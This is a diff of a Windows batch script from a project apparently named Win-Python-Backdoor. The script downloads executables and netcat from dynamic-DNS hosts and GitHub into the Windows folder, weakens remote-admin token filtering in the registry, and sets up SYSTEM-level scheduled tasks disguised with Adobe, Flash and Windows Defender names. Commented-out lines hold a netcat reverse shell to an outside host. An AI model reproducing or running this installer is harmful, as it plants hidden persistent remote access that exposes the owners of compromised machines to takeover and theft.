@@ -34,19 +34,20 @@ rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Back
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/get.bat','%windir%\get.bat')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
 set url='http://config02.addns.org'
+set urlgit='https://github.com/pistacchietto/Win-Python-Backdoor/raw/master'
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wofficeie1.exe','%windir%\wofficeie1.exe')
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
-wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\wup.exe
-wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\woffice.exe
-wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/nc64.exe  -O %windir%\nc64.exe
-wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/get.bat  -O %windir%\get.bat
-wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/sys.xml  -O %windir%\sys.xml
-wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/syskill.xml  -O %windir%\syskill.xml
-wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/office_get.xml  -O %windir%\office_get.xml
+wget --no-check-certificate %urlgit%/wup.exe  -O %windir%\wup.exe
+wget --no-check-certificate %urlgit%/wup.exe  -O %windir%\woffice.exe
+wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
+wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
+wget --no-check-certificate %urlgit%/sys.xml  -O %windir%\sys.xml
+wget --no-check-certificate %urlgit%/syskill.xml  -O %windir%\syskill.xml
+wget --no-check-certificate %urlgit%/office_get.xml  -O %windir%\office_get.xml
 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
 rem %windir%\wofficeie1.exe
 SLEEP 10
@@ -58,8 +59,8 @@ net start wup
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
 schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
-schtasks /create /tn sys /xml %windir%\sys.xml /F
-schtasks /create /tn syskill /xml %windir%\syskill.xml /F
+rem schtasks /create /tn sys /xml %windir%\sys.xml /F
+rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F
 schtasks /create /tn office_get /xml %windir%\office_get.xml /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
 rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im nc64.exe"  /tn syskill /rl highest /F
